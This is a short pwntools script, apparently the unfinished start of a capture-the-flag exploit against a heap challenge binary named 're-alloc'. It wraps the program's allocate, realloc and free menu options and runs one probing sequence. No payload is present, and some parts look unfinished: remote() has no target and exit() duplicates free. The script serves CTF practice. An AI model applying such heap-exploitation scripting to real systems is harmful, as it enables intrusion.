from pwn import *
debug = 1
if debug:
	s = process('./re-alloc')
	raw_input('debug')
else:
	s = remote()

def alloc(index,size,data):
#0x00000000040133C
	s.sendlineafter("Your choice: ",'1')
	s.sendlineafter('Index:',str(index))
	s.sendlineafter('Size:',str(size))
	s.sendlineafter('Data:',data)

def realloc(index,size,data):
#0x00000000040149A
	s.sendlineafter("Your choice: ",'2')
	s.sendlineafter('Index:',str(index))
	s.sendlineafter('Size:',str(size))
	s.sendlineafter('Data:',data)
	
def rfree(index):
	s.sendlineafter("Your choice: ",'3')
	s.sendlineafter('Index:',str(index))

def exit():
	s.sendlineafter("Your choice: ",'3')

alloc(0,0x40,'lethanhtuan')
realloc(0,0x10,'realloc')
rfree(0)

s.interactive()
s.close()